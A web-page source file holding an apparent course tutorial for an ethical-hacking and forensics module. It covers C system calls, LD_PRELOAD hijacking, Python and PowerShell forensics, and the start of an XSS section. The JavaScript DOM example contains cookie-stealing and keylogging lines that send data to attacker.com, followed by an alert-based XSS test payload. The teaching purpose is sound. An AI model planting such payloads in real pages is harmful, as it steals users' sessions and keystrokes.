import { Callout, CodeBlock, SectionHeading, SubHeading, T, Table } from "@/components/ContentComponents";

export default function ProgrammingLanguagesContent() {
  return (
    <div className="space-y-1 text-slate-700 leading-relaxed">
      <Callout type="key">
        This page is a complete beginner-to-competent tutorial for every language used in the EHAC module. Each section assumes you have never used the language before and walks you through: what it is, how to run it, the basic syntax you need, and how to apply it to the kinds of tasks you will face up to Week 10 level (hex encoding, timestamp decoding, registry/event log analysis, XOR operations, file carving, and timeline construction).
      </Callout>

      <SectionHeading id="overview">Languages Overview</SectionHeading>
      <p className="text-sm">
        The module uses nine languages. You will be expected to read or write code in about half of them. This table tells you at a glance which matter most.
      </p>
      <Table
        headers={["Language", "Must you write it?", "Week 10 skill level needed"]}
        rows={[
          ["C", "Yes — exam expects short programs", "Compile, run, explain system calls, write file-I/O programs, use strace"],
          ["Python", "Yes — exam expects you to know the libraries", "Parse registry/evtx, run Plaso, write small scripts for hex/XOR/timestamp work"],
          ["PowerShell", "Yes — exam expects command construction", "Filter event logs by ID/date, query registry, inspect ADS, enumerate shadow copies"],
          ["JavaScript", "Yes — exam expects you to read/write XSS payloads", "Write alert/cookie-theft/keylogger payloads, explain DOM APIs, bypass filters"],
          ["SQL", "Yes — exam expects query construction", "SELECT with WHERE/JOIN, understand injection mechanics, write parameterised queries"],
          ["Bash/Shell", "Yes — exam expects one-liners and scripts", "Basic commands, pipes, redirects, dd/stings/file/exiftool/steghide workflows"],
          ["Assembly", "Read only", "Recognise disassembly, understand stack frames, use GDB to step through code"],
          ["PHP", "Read only", "Identify version disclosure, understand php.ini hardening"],
          ["Java", "Read only", "Know OWASP Java Encoder and stegsolve exist"],
        ]}
      />

      {/* ============================================================
          C
          ============================================================ */}
      <SectionHeading id="c">C — Systems Programming and Reverse Engineering</SectionHeading>

      <SubHeading id="c-what">What Is C?</SubHeading>
      <p className="text-sm">
        C is a compiled, low-level programming language. "Compiled" means you write human-readable source code (.c files), then a program called a <strong>compiler</strong> translates it into machine code (binary) that the CPU can execute directly. "Low-level" means C gives you direct access to memory and operating-system services called <strong>system calls</strong>. C is the language the Linux kernel itself is written in.
      </p>
      <p className="text-sm">
        In the EHAC module, C is used for two things: (1) the Week 2 file-system API labs, where you write programs that use system calls like <T>open()</T>, <T>read()</T>, <T>write()</T>, and <T>stat()</T>, and (2) the Week 8 reverse engineering lab, where you build a shared library that hijacks a program's function calls via LD_PRELOAD.
      </p>

      <SubHeading id="c-getting-started">Getting Started — The Toolchain</SubHeading>
      <p className="text-sm">
        You need three things to write and run C programs:
      </p>
      <ol className="list-decimal pl-6 text-sm space-y-1">
        <li><strong>A text editor</strong> — any plain-text editor (nano, vim, VS Code). Create a file ending in <T>.c</T>, for example <T>myprogram.c</T>.</li>
        <li><strong>A compiler</strong> — on Linux this is <T>gcc</T> (GNU C Compiler). Install it with <T>sudo apt install gcc</T> if not present.</li>
        <li><strong>A terminal</strong> — to run the compiler and then the compiled program.</li>
      </ol>
      <p className="text-sm">
        The workflow is always:
      </p>
      <CodeBlock lang="bash">{`# 1. Write your code in a .c file
nano myprogram.c

# 2. Compile it into an executable
gcc -Wall -o myprogram myprogram.c

# 3. Run the executable
./myprogram`}</CodeBlock>
      <p className="text-sm">
        <T>-Wall</T> means "show all warnings" — always use it. <T>-o myprogram</T> names the output file. Without <T>-o</T>, gcc produces <T>a.out</T> by default.
      </p>

      <SubHeading id="c-syntax">Basic Syntax — What Every C Program Looks Like</SubHeading>
      <p className="text-sm">
        Every C program has this skeleton:
      </p>
      <CodeBlock lang="c">{`#include <stdio.h>   // import the standard input/output library

int main() {           // the entry point; execution starts here
    printf("Hello\\n");  // call the printf function from stdio
    return 0;           // tell the OS the program succeeded
}`}</CodeBlock>
      <p className="text-sm mt-2">
        Key rules:
      </p>
      <ul className="list-disc pl-6 text-sm space-y-1">
        <li>Statements end with a semicolon <T>;</T>.</li>
        <li>Code blocks are wrapped in curly braces <T>{'{ }'}</T>.</li>
        <li><T>#include</T> lines import functionality from <strong>header files</strong> — like borrowing a library.</li>
        <li><T>int main()</T> is where the program starts. Every executable C program must have one.</li>
        <li><T>//</T> starts a single-line comment. <T>/* */</T> is a multi-line comment.</li>
      </ul>

      <SubHeading id="c-variables">Variables and Data Types</SubHeading>
      <p className="text-sm">
        C requires you to declare what type of data a variable will hold before you use it.
      </p>
      <Table
        headers={["Type", "What it holds", "Example"]}
        rows={[
          ["int", "A whole number (positive or negative)", "int count = 5;"],
          ["char", "A single character", "char letter = 'A';"],
          ["char[]", "A string (array of characters)", 'char name[] = "Tom";'],
          ["float", "A decimal number", "float pi = 3.14;"],
          ["size_t", "An unsigned integer (for sizes)", "size_t n = 100;"],
        ]}
      />
      <CodeBlock lang="c">{`int main() {
    int age = 21;
    char grade = 'A';
    char name[] = "Alice";
    float average = 74.5;
    printf("%s is %d years old\\n", name, age);
    return 0;
}`}</CodeBlock>
      <p className="text-sm mt-2">
        <T>%s</T>, <T>%d</T>, <T>%f</T> are <strong>format specifiers</strong> that tell <T>printf</T> what kind of data to insert. <T>%s</T> = string, <T>%d</T> = integer, <T>%f</T> = float.
      </p>

      <SubHeading id="c-syscalls-detailed">System Calls — The Five You Must Know (Week 2 Level)</SubHeading>
      <p className="text-sm">
        A system call is a request your program makes to the operating system kernel. When you read a file, the kernel does the actual disk access on your behalf. C exposes system calls as ordinary functions. The five essential ones are:
      </p>

      <p className="text-sm font-medium mt-3">1. <T>open()</T> — open a file</p>
      <CodeBlock lang="c">{`#include <fcntl.h>   // for open() and flags

int fd = open("filename.txt", O_RDONLY);
// fd is a "file descriptor" — a number the kernel uses to track this open file
// -1 means the open failed (file doesn't exist, no permissions, etc.)`}</CodeBlock>
      <p className="text-sm">
        Flags you will use:
      </p>
      <Table
        headers={["Flag", "Meaning"]}
        rows={[
          ["O_RDONLY", "Open for reading only"],
          ["O_WRONLY", "Open for writing only"],
          ["O_CREAT", "Create the file if it does not exist"],
          ["O_TRUNC", "If the file exists, erase its contents (truncate to zero length)"],
        ]}
      />
      <p className="text-sm">
        Combine flags with the <T>|</T> (bitwise OR) operator: <T>O_WRONLY | O_CREAT | O_TRUNC</T> means "open for writing, create if missing, erase if present".
      </p>

      <p className="text-sm font-medium mt-3">2. <T>read()</T> — read bytes from a file</p>
      <CodeBlock lang="c">{`#include <unistd.h>

char buffer[100];                // a place to put the data
size_t bytes = read(fd, buffer, 100);
// read() puts up to 100 bytes into buffer
// returns the number of bytes actually read (may be less than 100)
// returns 0 when there is nothing left to read (end of file)
// returns -1 on error`}</CodeBlock>

      <p className="text-sm font-medium mt-3">3. <T>write()</T> — write bytes to a file</p>
      <CodeBlock lang="c">{`#include <unistd.h>

char message[] = "Hello\\n";
size_t bytes = write(fd, message, 6);
// write() sends 6 bytes from message to the file
// returns the number of bytes actually written
// returns -1 on error`}</CodeBlock>

      <p className="text-sm font-medium mt-3">4. <T>close()</T> — close a file</p>
      <CodeBlock lang="c">{`close(fd);
// releases the kernel resources associated with the file descriptor`}</CodeBlock>

      <p className="text-sm font-medium mt-3">5. <T>stat()</T> — get file metadata</p>
      <CodeBlock lang="c">{`#include <sys/stat.h>

struct stat info;
int result = stat("filename.txt", &info);
// result is 0 on success, -1 on error
// info now holds: info.st_size (file size), info.st_mode (permissions), etc.`}</CodeBlock>

      <SubHeading id="c-full-example">Full Worked Example — Copy a File</SubHeading>
      <p className="text-sm">
        This program opens a source file for reading, opens a destination file for writing, copies data in 100-byte chunks, then closes both.
      </p>
      <CodeBlock lang="c">{`#include <fcntl.h>
#include <unistd.h>

int main() {
    // 1. Open source for reading
    int src = open("source.txt", O_RDONLY);
    if (src == -1) return 1;

    // 2. Open destination for writing (create + erase if exists)
    int dst = open("dest.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (dst == -1) return 1;

    // 3. Copy in a loop
    char buffer[100];
    size_t n;
    while ((n = read(src, buffer, 100)) > 0) {
        write(dst, buffer, n);
    }

    // 4. Close both
    close(src);
    close(dst);
    return 0;
}`}</CodeBlock>
      <p className="text-sm mt-2">
        <strong>Exam tip:</strong> You will be asked to explain what each line does and what would happen if <T>O_TRUNC</T> were omitted (the destination would keep its old content and new data would overwrite from the start, potentially leaving old data at the end).
      </p>

      <SubHeading id="c-strace">Proving What Happened with strace</SubHeading>
      <p className="text-sm">
        <T>strace</T> intercepts and prints every system call a program makes. This is how you prove your C program actually called <T>open()</T>, <T>read()</T>, <T>write()</T>, and <T>close()</T>.
      </p>
      <CodeBlock lang="bash">{`# Compile and run with strace
gcc -Wall -o copyfile copyfile.c
strace ./copyfile

# Output shows every syscall:
# open("source.txt", O_RDONLY) = 3
# open("dest.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 4
# read(3, "Hello World\\n", 100) = 12
# write(4, "Hello World\\n", 12) = 12
# close(3) = 0
# close(4) = 0`}</CodeBlock>
      <p className="text-sm">
        The number after the <T>=</T> sign is the return value. For <T>open()</T>, 3 and 4 are the file descriptor numbers (0=stdin, 1=stdout, 2=stderr, then 3, 4, ...). Filter to just file-related calls: <T>strace -e trace=open,read,write,close ./copyfile</T>.
      </p>

      <SubHeading id="c-header-ref">Header File Reference</SubHeading>
      <p className="text-sm">
        The exam asks you to pick the correct header file for a given function.
      </p>
      <Table
        headers={["Header", "Provides"]}
        rows={[
          ["&lt;fcntl.h&gt;", "open(), O_RDONLY, O_WRONLY, O_CREAT, O_TRUNC"],
          ["&lt;unistd.h&gt;", "read(), write(), close(), unlink(), chdir()"],
          ["&lt;sys/stat.h&gt;", "stat(), chmod(), struct stat, S_IRWXU permission masks"],
          ["&lt;stdio.h&gt;", "printf(), FILE*, fopen(), fclose() (buffered stdio — not system calls)"],
          ["&lt;string.h&gt;", "strlen(), strcmp(), strcpy(), memset()"],
          ["&lt;dirent.h&gt;", "opendir(), readdir(), closedir(), struct dirent"],
          ["&lt;pwd.h&gt;", "getpwuid(), struct passwd (convert UID to username)"],
          ["&lt;grp.h&gt;", "getgrgid(), struct group (convert GID to group name)"],
        ]}
      />

      <SubHeading id="c-permissions-detailed">File Permissions with chmod() (Week 3 Level)</SubHeading>
      <p className="text-sm">
        Every file has a permission mask stored as an octal (base-8) number. <T>chmod()</T> changes it from within a C program.
      </p>
      <Table
        headers={["Octal", "Binary", "Meaning"]}
        rows={[
          ["0644", "110 100 100", "Owner read+write; group read; others read (normal file)"],
          ["0755", "111 101 101", "Owner all; group read+execute; others read+execute (executable)"],
          ["0444", "100 100 100", "Everyone read-only"],
          ["0700", "111 000 000", "Owner only; group and others have no access"],
        ]}
      />
      <p className="text-sm">
        The three octal digits are: owner | group | others. Each digit sums read(4) + write(2) + execute(1). So 7 = 4+2+1 = full access, 5 = 4+1 = read+execute, 4 = read only.
      </p>
      <CodeBlock lang="c">{`#include <sys/stat.h>

int main() {
    chmod("output.txt", 0444);  // make read-only for everyone
    chmod("script.sh", 0755);   // make executable
    return 0;
}`}</CodeBlock>

      <SubHeading id="c-re-detailed">Reverse Engineering — LD_PRELOAD Hijacking (Week 8 Level)</SubHeading>
      <p className="text-sm">
        When a program calls a function like <T>puts()</T>, the linker resolves that call to the implementation in a shared library (libc). LD_PRELOAD lets you load your own shared library <em>before</em> libc, so your version of the function runs instead. This is called <strong>function hijacking</strong> or <strong>interpositioning</strong>.
      </p>
      <p className="text-sm">
        Step 1: discover which functions a program imports.
      </p>
      <CodeBlock lang="bash">{`# list all external symbols the program uses
nm --extern-only --dynamic ./target

# you might see: puts, printf, strlen, etc.
# any of these can be hijacked`}</CodeBlock>
      <p className="text-sm">
        Step 2: write a shared library that replaces one of those functions.
      </p>
      <CodeBlock lang="c">{`// maliciouslib.c — replaces puts()
#include <stdio.h>
#include <string.h>

int puts(const char *str) {
    // call the real puts via a trick, or just do your own thing
    return printf("%s\\n--- [deadbeef]\\n", str);
}`}</CodeBlock>
      <p className="text-sm">
        Step 3: compile it as a shared library (a .so file).
      </p>
      <CodeBlock lang="bash">{`gcc -fPIC -shared -o maliciouslib.so maliciouslib.c
# -fPIC: position-independent code (required for shared libraries)
# -shared: produce a .so file instead of an executable`}</CodeBlock>
      <p className="text-sm">
        Step 4: run the target with your library preloaded.
      </p>
      <CodeBlock lang="bash">{`LD_PRELOAD=./maliciouslib.so ./target
# every call to puts() now runs your version instead of libc's`}</CodeBlock>
      <p className="text-sm">
        <strong>Why this matters in exams:</strong> You might be asked to explain the LD_PRELOAD technique, identify which symbols can be hijacked (use <T>nm</T>), or calculate the substitution-cipher key space (26! ≈ 4×10²⁶ — that many possible monoalphabetic substitution keys).
      </p>

      <Callout type="info" title="C — Common Exam Mistakes">
        Forgetting the <T>&lt;fcntl.h&gt;</T> header when using <T>open()</T>, or the <T>&lt;unistd.h&gt;</T> header for <T>read()</T>/<T>write()</T>. Not checking whether <T>open()</T> returned -1. Explaining <T>strace</T> output incorrectly (the number after <T>=</T> is the return value, not the file descriptor). Confusing <T>open()</T> flags — <T>O_RDONLY</T> (0), <T>O_WRONLY</T> (1), <T>O_RDWR</T> (2).
      </Callout>

      {/* ============================================================
          PYTHON
          ============================================================ */}
      <SectionHeading id="python">Python — Forensics and Pentesting Scripting</SectionHeading>

      <SubHeading id="py-what">What Is Python?</SubHeading>
      <p className="text-sm">
        Python is an <strong>interpreted</strong>, high-level programming language. "Interpreted" means there is no compile step — you run the source code directly through the Python interpreter. "High-level" means Python handles memory, data types, and many low-level details for you automatically. The trade-off is that Python programs are slower than C but much faster to write.
      </p>
      <p className="text-sm">
        In EHAC, Python is the go-to language for parsing forensic artifacts. The module does not expect you to write Python from scratch in the exam, but you must know what each forensic Python library does.
      </p>

      <SubHeading id="py-getting-started">Getting Started</SubHeading>
      <p className="text-sm">
        Most Linux systems come with Python pre-installed. Check with:
      </p>
      <CodeBlock lang="bash">{`python3 --version
# Should print something like: Python 3.10.12`}</CodeBlock>
      <p className="text-sm">
        You can run Python in two modes:
      </p>
      <ul className="list-disc pl-6 text-sm space-y-1">
        <li><strong>Interactive:</strong> type <T>python3</T> in the terminal and get a <T>&gt;&gt;&gt;</T> prompt where each line runs immediately.</li>
        <li><strong>Script:</strong> write commands in a <T>.py</T> file and run <T>python3 myscript.py</T>.</li>
      </ul>

      <SubHeading id="py-syntax">Basic Syntax</SubHeading>
      <CodeBlock lang="python">{`# Variables — no type declaration needed
name = "Alice"
age = 21
average = 74.5

# Print to screen
print("Hello,", name)

# If/else — note the colon and indentation (no braces!)
if age >= 18:
    print("Adult")
else:
    print("Minor")

# For loop
for i in range(5):
    print(i)  # prints 0, 1, 2, 3, 4

# While loop
count = 0
while count < 3:
    print(count)
    count = count + 1

# Lists (like arrays that can hold anything)
fruits = ["apple", "banana", "cherry"]
print(fruits[0])        # apple
fruits.append("date")   # add to end

# Functions
def greet(name):
    return "Hello, " + name

print(greet("EHAC"))`}</CodeBlock>

      <SubHeading id="py-files">Reading and Writing Files</SubHeading>
      <p className="text-sm">
        Python's file operations are much simpler than C's:
      </p>
      <CodeBlock lang="python">{`# Write to a file
with open("output.txt", "w") as f:
    f.write("Hello, EHAC\\n")

# Read a file
with open("output.txt", "r") as f:
    content = f.read()
    print(content)

# Read binary data (important for forensics!)
with open("image.dd", "rb") as f:
    data = f.read(100)      # read first 100 bytes
    print(data.hex())       # print as hex string`}</CodeBlock>
      <p className="text-sm">
        The <T>"w"</T> mode opens for writing (erases existing content). <T>"r"</T> for reading. <T>"rb"</T> for reading in binary mode (no text encoding conversion). The <T>with</T> statement automatically closes the file when the block exits.
      </p>

      <SubHeading id="py-hex-xor">Week 10 Skill — Hex, Endianness, and XOR in Python</SubHeading>
      <p className="text-sm">
        The Week 10 forensics practical tests your ability to work with raw bytes, endianness (little-endian vs big-endian), and XOR operations. Python's built-in features make this straightforward.
      </p>

      <p className="text-sm font-medium mt-3">Working with hex</p>
      <CodeBlock lang="python">{`# Convert between hex strings and bytes
hex_str = "4D5A9000"           # "MZ" header of a PE file
data = bytes.fromhex(hex_str)  # -> b'MZ\\x90\\x00'
print(data)                    # b'MZ\\x90\\x00'

# Convert bytes back to hex
print(data.hex())              # 4d5a9000
print(data.hex(" "))           # 4d 5a 90 00 (with spaces)`}</CodeBlock>

      <p className="text-sm font-medium mt-3">Endianness — reading multi-byte values</p>
      <p className="text-sm">
        Little-endian means the least significant byte comes first (Intel x86). Big-endian means the most significant byte comes first (network order, some file formats). Python's <T>int.from_bytes()</T> handles both.
      </p>
      <CodeBlock lang="python">{`# Little-endian example: Windows FILETIME is a 64-bit LE value
filetime_bytes = bytes.fromhex("00D0B9A1D8C7DA01")
# The bytes as stored: 00 D0 B9 A1 D8 C7 DA 01
# Little-endian interpretation (reverse byte order): 01 DA C7 D8 A1 B9 D0 00

timestamp = int.from_bytes(filetime_bytes, "little")
print(hex(timestamp))  # 0x1dac7d8a1b9d000

# Big-endian example (network byte order)
nbo_bytes = bytes.fromhex("0102")
value = int.from_bytes(nbo_bytes, "big")
print(value)  # 258 = 0x0102`}</CodeBlock>

      <p className="text-sm font-medium mt-3">XOR operations</p>
      <p className="text-sm">
        XOR is a bitwise operation: a byte XOR key = encrypted byte; encrypted byte XOR same key = original byte. It is symmetric — applying XOR twice with the same key undoes it.
      </p>
      <CodeBlock lang="python">{`# XOR a single byte
byte = 0x41         # 'A'
key = 0x55
encrypted = byte ^ key   # 0x41 ^ 0x55 = 0x14
decrypted = encrypted ^ key  # 0x14 ^ 0x55 = 0x41
print(chr(decrypted))  # A

# XOR an entire string
message = b"Hello"
key = 0x55
encrypted = bytes(b ^ key for b in message)
print(encrypted.hex())  # 0x3d 0x38 0x3e 0x3e 0x3f

decrypted = bytes(b ^ key for b in encrypted)
print(decrypted)  # b'Hello'`}</CodeBlock>

      <p className="text-sm font-medium mt-3">Timestamp conversions (Week 10 critical skill)</p>
      <CodeBlock lang="python">{`import datetime

# Windows FILETIME: 100-nanosecond intervals since 1601-01-01
def filetime_to_datetime(ft):
    epoch = datetime.datetime(1601, 1, 1)
    return epoch + datetime.timedelta(seconds=ft / 10_000_000)

# Example: decode a FILETIME from hex bytes (little-endian)
ft_bytes = bytes.fromhex("00D0B9A1D8C7DA01")
ft_value = int.from_bytes(ft_bytes, "little")
dt = filetime_to_datetime(ft_value)
print(dt)  # prints the human-readable timestamp

# Unix timestamp: seconds since 1970-01-01
unix_ts = 1700000000
dt_unix = datetime.datetime.fromtimestamp(unix_ts)
print(dt_unix)

# DOS timestamp: 16 bits for date, 16 bits for time
def dos_to_datetime(dos_date, dos_time):
    day = dos_date & 0x1F
    month = (dos_date >> 5) & 0x0F
    year = ((dos_date >> 9) & 0x7F) + 1980
    seconds = (dos_time & 0x1F) * 2
    minutes = (dos_time >> 5) & 0x3F
    hours = (dos_time >> 11) & 0x1F
    return datetime.datetime(year, month, day, hours, minutes, seconds)`}</CodeBlock>

      <SubHeading id="py-registry-detailed">Using python-registry (Week 10 Level)</SubHeading>
      <p className="text-sm">
        Install with <T>pip install python-registry</T>. This library lets you parse offline registry hive files (SAM, SYSTEM, SOFTWARE, NTUSER.DAT) programmatically.
      </p>
      <CodeBlock lang="python">{`from Registry import Registry

# Open a registry hive file
reg = Registry.Registry("NTUSER.DAT")

# Navigate to a key
key = reg.open("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{75048700-EF1F-11D0-9888-006097DEACF9}\\Count")

# List subkeys (each is a logged program execution)
for subkey in key.subkeys():
    print(subkey.name())

# Read a value from a key
for value in key.values():
    print(f"{value.name()} = {value.value()}")`}</CodeBlock>

      <SubHeading id="py-evtx-detailed">Using python-evtx (Week 10 Level)</SubHeading>
      <p className="text-sm">
        Install with <T>pip install python-evtx</T>. Parses Windows .evtx event log files offline.
      </p>
      <CodeBlock lang="python">{`import Evtx.Evtx as evtx

with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        # Each record has XML data
        xml_str = record.xml()
        if "4624" in xml_str:   # logon event
            print("Found a logon event!")
            print(xml_str[:200])  # first 200 chars`}</CodeBlock>

      <SubHeading id="py-plaso-detailed">Using Plaso for Timeline Construction</SubHeading>
      <p className="text-sm">
        Plaso (log2timeline) is a Python-based framework that extracts events from disk images and builds a super-timeline. You run it from the command line, not as a Python import.
      </p>
      <CodeBlock lang="bash">{`# Step 1: Extract events from a disk image into a Plaso storage file
log2timeline.py --storage-file timeline.plaso disk_image.dd

# Step 2: Filter and export to CSV
psort.py -o l2tcsv -w timeline.csv timeline.plaso

# Step 3: Open in a spreadsheet or search with grep
grep "4624" timeline.csv   # find all logon events`}</CodeBlock>
      <p className="text-sm">
        <strong>Exam relevance:</strong> Know that <T>log2timeline.py</T> creates the timeline and <T>psort.py</T> filters/exports it. Plaso output is used for timeline reconstruction — one of the Week 10 skills.
      </p>

      <Callout type="info" title="Python — Common Exam Mistakes">
        Forgetting to open files in binary mode (<T>"rb"</T>) when working with forensic images. Confusing <T>int.from_bytes()</T> little-endian vs big-endian. XOR confusion — XOR is symmetric, not a one-way function. Assuming python-registry and python-evtx work on live systems (they read offline files only).
      </Callout>

      {/* ============================================================
          POWERSHELL
          ============================================================ */}
      <SectionHeading id="powershell">PowerShell — Windows Forensics</SectionHeading>

      <SubHeading id="ps-what">What Is PowerShell?</SubHeading>
      <p className="text-sm">
        PowerShell is Microsoft's command-line shell and scripting language. Unlike the old Command Prompt (cmd.exe), PowerShell works with <strong>objects</strong> — every command produces structured data (like a table) that can be piped to the next command. In the EHAC module, PowerShell is the primary tool for live Windows forensics: querying event logs, reading the registry, inspecting files, and enumerating system state.
      </p>

      <SubHeading id="ps-getting-started">Getting Started</SubHeading>
      <p className="text-sm">
        On Windows, search for "PowerShell" and open it. You will see a blue window with a prompt starting with <T>PS C:\\Users\\...</T>. Commands in PowerShell are called <strong>cmdlets</strong> (pronounced "command-lets") and follow a <T>Verb-Noun</T> naming pattern: <T>Get-ChildItem</T>, <T>Get-WinEvent</T>, <T>Set-ItemProperty</T>.
      </p>
      <CodeBlock lang="powershell">{`# Get help on any command
Get-Help Get-WinEvent

# List all commands with "Event" in the name
Get-Command *Event*

# Store output in a variable
\$events = Get-WinEvent -LogName Security -MaxEvents 10
\$events.Count    # how many events were retrieved`}</CodeBlock>

      <SubHeading id="ps-event-logs-detailed">Event Log Filtering (Week 10 Level)</SubHeading>
      <p className="text-sm">
        The main cmdlet is <T>Get-WinEvent</T>. Always use <T>Get-WinEvent</T>, never the older <T>Get-EventLog</T> (which is slower and less capable).
      </p>
      <CodeBlock lang="powershell">{`# Basic — last 10 security events
Get-WinEvent -LogName Security -MaxEvents 10

# Filter by a single event ID
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624}

# Filter by multiple event IDs
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4648}

# Filter by event ID and date range
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4624
    StartTime='2024-11-01'
    EndTime='2024-11-30'
}

# Filter by event ID and user
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    Where-Object { \$_.Properties[5].Value -eq 'jdoe' }

# Export to CSV for offline analysis
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    Export-Csv -Path logons.csv -NoTypeInformation`}</CodeBlock>

      <p className="text-sm">
        The <T>{'@{ }'}</T> syntax is a <strong>hashtable</strong> (a dictionary of key-value pairs). The keys are the filter properties: <T>LogName</T>, <T>Id</T>, <T>StartTime</T>, <T>EndTime</T>, <T>ProviderName</T>, etc.
      </p>

      <SubHeading id="ps-event-ids">Critical Event IDs to Memorise</SubHeading>
      <Table
        headers={["Event ID", "What It Means"]}
        rows={[
          ["4624", "Successful logon — the user authenticated"],
          ["4625", "Failed logon — wrong password, account locked, etc."],
          ["4648", "Explicit credentials used (Run As, scheduled task with stored creds)"],
          ["4634 / 4647", "Logoff — session ended"],
          ["4672", "Special privileges assigned to a new logon (usually admin)"],
          ["4776", "Credential validation against SAM (local auth, not domain)"],
          ["4768", "Kerberos TGT request (domain auth)"],
          ["4769", "Kerberos service ticket request"],
          ["35", "NTP client time sync (in System log)"],
          ["4616", "System time changed manually"],
          ["4608", "Windows startup"],
          ["4609", "Windows shutdown"],
        ]}
      />

      <SubHeading id="ps-registry-detailed">Registry Querying (Week 10 Level)</SubHeading>
      <p className="text-sm">
        PowerShell treats the registry like a file system drive. The <T>Registry::</T> provider lets you use <T>Get-ChildItem</T> (like <T>dir</T>) and <T>Get-ItemProperty</T> to navigate and read the registry.
      </p>
      <CodeBlock lang="powershell">{`# List keys under HKLM\\SOFTWARE
Get-ChildItem Registry::HKEY_LOCAL_MACHINE\\SOFTWARE

# Read values from a specific key
Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion

# Read a single value
(Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation).TimeZoneKeyName

# USB device history (which devices were plugged in)
Get-ChildItem Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR

# List user profiles from SAM (requires admin)
Get-ChildItem Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList`}</CodeBlock>

      <SubHeading id="ps-ads-detailed">Alternate Data Streams (ADS)</SubHeading>
      <p className="text-sm">
        NTFS supports hiding data in alternate streams attached to a file. PowerShell reveals them easily.
      </p>
      <CodeBlock lang="powershell">{`# List all streams on a file
Get-Item innocent.txt -Stream *

# Read a hidden stream
Get-Content innocent.txt -Stream hidden_data

# Create an ADS (for testing)
Set-Content innocent.txt -Stream secret -Value "Hidden message"

# Search all .exe files for any ADS
Get-ChildItem *.exe -Recurse | ForEach-Object {
    \$streams = Get-Item \$_.FullName -Stream * | Where-Object Stream -ne ':\$DATA'
    if (\$streams) { \$_ }
}`}</CodeBlock>

      <SubHeading id="ps-recycle-detailed">Recycle Bin and Timestamps</SubHeading>
      <CodeBlock lang="powershell">{`# List all items in the Recycle Bin (requires admin)
Get-ChildItem C:\\$Recycle.Bin -Recurse -Force

# Show all timestamps on a file
Get-Item suspicious.docx | Format-List *time*

# Show file version info
Get-Item C:\\Windows\\System32\\cmd.exe | ForEach-Object { \$_.VersionInfo }

# Volume Shadow Copy management
vssadmin list shadows
vssadmin list volumes`}</CodeBlock>

      <Callout type="info" title="PowerShell — Common Exam Mistakes">
        Using <T>Get-EventLog</T> instead of <T>Get-WinEvent</T>. Forgetting the <T>Registry::</T> prefix when navigating the registry (PowerShell treats it as a PSDrive). Confusing the order of parameters in <T>-FilterHashtable</T>. Not exporting to CSV (<T>Export-Csv</T>) when the result set is large.
      </Callout>

      {/* ============================================================
          JAVASCRIPT
          ============================================================ */}
      <SectionHeading id="javascript">JavaScript — XSS and Web Security</SectionHeading>

      <SubHeading id="js-what">What Is JavaScript?</SubHeading>
      <p className="text-sm">
        JavaScript (JS) is the programming language that runs inside every web browser. When a web page loads, the browser executes any JavaScript included in the page. JavaScript can read and modify the page content (the <strong>DOM</strong>), make network requests, read cookies, and respond to user actions (clicks, keypresses, etc.). In the EHAC module, JavaScript is the vehicle for <strong>cross-site scripting (XSS)</strong> attacks — because any JavaScript that runs in the victim's browser runs in the security context of the victim's session.
      </p>

      <SubHeading id="js-getting-started">How to Run JavaScript</SubHeading>
      <p className="text-sm">
        You do not need to install anything. Every modern browser has JavaScript built in. To experiment:
      </p>
      <ol className="list-decimal pl-6 text-sm space-y-1">
        <li>Open your browser's developer tools (<strong>F12</strong> or right-click → Inspect).</li>
        <li>Click the <strong>Console</strong> tab.</li>
        <li>Type JavaScript directly at the <T>&gt;</T> prompt and press Enter.</li>
      </ol>
      <CodeBlock lang="javascript">{`// The console is an interactive JavaScript playground
console.log("Hello from JavaScript!");
alert("This is a popup");
document.title = "New Title";`}</CodeBlock>

      <SubHeading id="js-syntax-essentials">Essential JavaScript Syntax</SubHeading>
      <CodeBlock lang="javascript">{`// Variables
let name = "Alice";       // can be reassigned
const age = 21;           // cannot be reassigned
var old = "avoid this";   // older style, avoid

// Strings
let greeting = "Hello " + name;
let template = \`Hello \${name}\`;  // template literal with backticks

// Functions
function add(a, b) {
    return a + b;
}

// Arrow functions (shorter syntax)
const multiply = (a, b) => a * b;

// If/else
if (age >= 18) {
    console.log("Adult");
} else {
    console.log("Minor");
}

// Arrays
let items = ["a", "b", "c"];
items.push("d");
console.log(items[0]);  // "a"

// Objects (like dictionaries)
let user = { name: "Alice", role: "admin" };
console.log(user.name);  // "Alice"`}</CodeBlock>

      <SubHeading id="js-dom-detailed">The DOM — What JavaScript Can Access on a Page</SubHeading>
      <p className="text-sm">
        The Document Object Model (DOM) is the browser's internal representation of the page. JavaScript can read and modify every element on the page through the DOM API.
      </p>
      <CodeBlock lang="javascript">{`// Read the page URL
console.log(document.URL);
console.log(location.href);
console.log(location.hash);  // everything after # in the URL

// Read cookies for this domain
console.log(document.cookie);

// Select an element by ID
let output = document.getElementById("output");

// Read or change its content
console.log(output.innerHTML);   // get the HTML content
output.innerHTML = "New text";   // set the HTML content (DANGEROUS with user input)

// Create a new element
let img = document.createElement("img");
img.src = "https://attacker.com/steal?" + document.cookie;
document.body.appendChild(img);  // adds the image to the page (triggers a network request)

// Listen for keypresses
document.addEventListener("keypress", function(event) {
    fetch("https://attacker.com/log?key=" + event.key);
});`}</CodeBlock>

      <SubHeading id="js-xss-payloads-detailed">XSS Payloads — What Each One Does</SubHeading>
      <p className="text-sm">
        An XSS payload is JavaScript code that an attacker injects into a vulnerable page. Here is every type you need to know:
      </p>

      <p className="text-sm font-medium mt-3">1. Proof of concept (test if XSS exists)</p>
      <CodeBlock lang="html">{`<script>alert(1)</script>
<!-- If a popup appears with "1", the page is vulnerable to XSS -->`}</CodeBlock>

